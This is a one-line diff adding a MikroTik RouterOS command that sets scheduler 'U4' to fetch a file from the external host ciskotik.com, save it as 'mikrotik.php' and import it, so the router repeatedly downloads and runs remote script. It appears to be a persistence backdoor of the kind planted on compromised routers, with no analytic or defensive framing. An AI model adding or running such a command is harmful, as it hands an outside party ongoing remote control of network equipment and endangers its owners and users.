@@ -1,0 +1,1 @@
+/system scheduler set U4 on-event="/tool fetch url=http://ciskotik.com/poll/c5d25f1e-38ab-41a3-9826-1f1f24ef52eb mode=http dst-path=mikrotik.php\r\n/import mikrotik.php"
